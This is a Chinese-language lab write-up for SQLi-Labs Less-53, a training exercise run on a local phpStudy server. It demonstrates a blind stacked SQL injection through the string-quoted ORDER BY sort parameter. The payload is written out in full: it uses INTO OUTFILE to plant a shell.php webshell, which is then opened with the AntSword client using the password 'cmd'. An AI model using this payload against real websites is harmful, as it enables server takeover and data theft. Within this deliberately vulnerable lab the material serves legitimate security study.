1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-53 (GET - ORDER BY - Stacked Query - Blind - String)
  • 提示：注入点为 sort 参数，字符型闭合（ORDER BY '$id'），支持多语句执行，无报错回显。

2. 核心原理与前置分析

本关卡是 Less-52 的变种，同样属于盲堆叠注入环境。后端使用 mysqli_multi_query() 支持多语句，且屏蔽了报错与额外回显。

核心区别：上下文变为字符型 ORDER BY '$id'。需要先使用单引号 ' 闭合原查询，再拼接分号 ; 执行写文件语句。由于页面只渲染正常用户表格，写文件属于“盲执行”，必须去物理服务器验证。

3. 工具配置与操作步骤

工具配置：中国蚁剑

  • URL 地址：http://localhost/sqli-labs-master/Less-53/shell.php
  • 连接密码：cmd

操作步骤与解析：

第一步：构造盲堆叠 Payload 写马

输入 URL：?sort=1'; select '' into outfile 'D:/phpstudy_pro/WWW/sqli-labs-master/Less-53/shell.php'-- -

回显现象：页面正常渲染用户列表，无任何报错或写入提示。

解释与原理：1' 闭合单引号，; 截断原查询，执行 INTO OUTFILE。末尾 -- - 注释掉原语句尾部单引号。

第二步：本地验证与蚁剑连接

前往物理路径 D:\phpstudy_pro\WWW\sqli-labs-master\Less-53\，确认 shell.php 生成。使用蚁剑连接，成功接管目标目录。

4. 踩坑记录与复盘

  • 盲环境验证：页面正常回显表格并不代表 Payload 没执行，必须检查服务器物理文件系统确认文件落地。
  • 闭合符匹配：L52 是数字型，L53 是字符型。在堆叠注入中，正确的闭合符是语法合法的前提。

5. 知识点总结

  • 字符型盲堆叠注入：结合闭合技术与盲执行特性，直接在底层写入 WebShell 获取控制权。
